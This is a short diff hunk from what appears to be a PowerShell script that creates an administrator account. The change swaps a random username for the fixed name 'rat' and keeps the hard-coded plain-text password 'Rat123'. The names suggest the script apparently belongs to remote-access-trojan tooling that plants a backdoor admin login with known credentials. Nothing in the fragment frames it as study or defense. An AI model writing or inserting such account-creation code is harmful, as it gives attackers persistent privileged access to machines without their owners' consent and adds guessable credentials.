@@ -27,7 +27,7 @@ function create_account {
     }
 }
 #create admin user
-$uname = random_text
+$uname = "rat"
 $pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
